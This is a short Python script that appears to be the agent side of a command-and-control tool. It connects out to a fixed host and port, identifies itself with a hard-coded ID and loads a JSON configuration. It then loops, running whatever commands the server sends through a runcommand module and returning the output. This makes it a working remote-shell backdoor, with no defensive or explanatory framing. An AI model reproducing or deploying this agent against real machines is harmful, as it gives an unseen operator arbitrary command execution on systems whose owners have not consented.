#!/usr/bin/python3
#coding: utf-8

import socket
import logging
import json
from modules import runcommand

logging.basicConfig(format='%(asctime)s: %(message)s', level=logging.DEBUG)

REMOTE_HOST = '127.0.0.1'
REMOTE_PORT = 8081
ID = "acb123"

client = socket.socket()

logging.debug("Connection initiating...")

client.connect((REMOTE_HOST, REMOTE_PORT))

logging.debug("Connection initiated!")

message = "CONNECT %s" % ID
message = message.encode()

logging.debug('Sending message: %s', message)
client.send(message)
logging.debug('Sended')

logging.debug("Awaiting for configuration...")
message = client.recv(4096)

config = message.decode().replace("SET_CONFIG ", "")
print(config)
config = json.loads(config)
logging.debug(f'Configuration received: {config}')

while True:
    logging.debug("Awaiting commands...")

    command = client.recv(1024)
    command = command.decode()

    output = runcommand.run(command=command)

    logging.debug("Sending response...")

    client.send(output)
